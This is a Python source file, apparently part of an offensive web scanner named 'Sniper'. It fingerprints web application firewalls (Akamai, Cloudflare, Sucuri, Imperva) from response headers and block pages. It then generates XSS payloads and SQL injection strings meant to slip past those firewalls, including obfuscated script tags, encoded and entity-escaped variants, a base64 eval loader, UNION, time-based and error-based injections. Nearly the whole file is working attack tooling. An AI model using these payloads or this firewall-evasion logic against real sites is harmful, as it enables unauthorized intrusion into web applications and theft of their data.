import base64
from typing import Dict, List


class WAFDetector:
    """
    Fingerprint leve de WAF para uso rÃ¡pido no Sniper.
    Recebe um httpx.Response e retorna vendor, modo e confianÃ§a.
    """

    SIGNATURES: Dict[str, Dict[str, List[str]]] = {
        "akamai": {
            "headers": ["x-akamai", "x-akamai-", "akamai"],
            "server": ["akamai", "akamaighost"],
            "body": ["reference #", "access denied", "edgesuite", "akamai"],
            "codes": [403, 406, 503],
        },
        "cloudflare": {
            "headers": ["cf-ray", "cf-cache", "cf-request"],
            "server": ["cloudflare"],
            "body": ["cloudflare", "cf-ray", "attention required"],
            "codes": [403, 503, 520],
        },
        "sucuri": {
            "headers": ["x-sucuri", "x-sucuri-"],
            "server": ["sucuri"],
            "body": ["sucuri", "cloudproxy"],
            "codes": [403, 503],
        },
        "imperva": {
            "headers": ["x-iinfo", "incapsula"],
            "server": ["incapsula"],
            "body": ["incapsula", "imperva"],
            "codes": [403, 404],
        },
    }

    def detect(self, response) -> Dict:
        waf_vendor = "unknown"
        block_mode = None
        confidence = 0

        if response is None:
            return {"detected": False, "vendor": waf_vendor, "mode": block_mode, "confidence": confidence}

        if response.status_code in (403, 406, 503, 520):
            block_mode = f"http_{response.status_code}"
            confidence += 30

        headers = {k.lower(): v for k, v in response.headers.items()}
        server_header = headers.get("server", "").lower()

        body = ""
        try:
            body = response.text.lower() if response.text else ""
        except Exception:
            body = ""

        for vendor, sig in self.SIGNATURES.items():
            if any(h for h in headers if any(h.startswith(s) for s in sig["headers"])):
                waf_vendor = vendor
                block_mode = "header_match"
                confidence = max(confidence, 70)

            if server_header and any(s in server_header for s in sig["server"]):
                waf_vendor = vendor
                block_mode = "server_match"
                confidence = max(confidence, 80)

            if body and any(pat in body for pat in sig["body"]):
                waf_vendor = vendor
                block_mode = "body_match"
                confidence = max(confidence, 60)

        if body and ("reference #" in body and "edgesuite" in body):
            waf_vendor = "akamai"
            block_mode = "akamai_block_page"
            confidence = 95

        return {
            "detected": confidence > 50,
            "vendor": waf_vendor,
            "mode": block_mode,
            "confidence": confidence,
        }


class PayloadGenerator:
    """
    Gera payloads adaptativos de XSS/SQLi com foco em bypass rÃ¡pido.
    """

    def __init__(self, waf_vendor: str = "unknown"):
        self.waf_vendor = waf_vendor

    def _html_entity(self, payload: str) -> str:
        return "".join(f"&#{ord(c)};" for c in payload)

    def generate_xss(self, base: str = "alert(1)", variations: int = 8) -> List[str]:
        payloads = [
            f"<ScRiPt>{base}</ScRiPt>",
            f"<script%0a>{base}</script>",
            f"<script%09>{base}</script>",
            f"<sc<!--x-->ript>{base}</sc<!--x-->ript>",
            f"%3Cscript%3E{base}%3C/script%3E",
            self._html_entity(f"<script>{base}</script>"),
            f"<svg/onload={base}>",
            f"<img src=x onerror={base}>",
            f"<iframe srcdoc='&lt;script&gt;{base}&lt;/script&gt;'></iframe>",
        ]

        b64 = base64.b64encode(base.encode()).decode()
        payloads.insert(0, f"<script>eval(atob('{b64}'))</script>")

        if self.waf_vendor == "akamai":
            return payloads[:variations]

        return payloads[:variations]

    def generate_sqli(self, base: str = "1", variations: int = 8) -> List[str]:
        payloads = [
            f"{base}' OR '1'='1",
            f"{base}\" OR \"1\"=\"1",
            f"{base} UNION SELECT NULL--",
            f"{base} UNION SELECT NULL,NULL--",
            f"{base}'/**/OR/**/'1'='1",
            f"{base}%27%20OR%20%271%27%3D%271",
            f"{base}%2527%2520OR%2520%25271%2527%253D%25271",
            f"{base}' OR SLEEP(5)--",
            f"{base}' AND 1=CONVERT(int, @@version)--",
        ]

        if self.waf_vendor == "akamai":
            return payloads[:variations]

        return payloads[:variations]

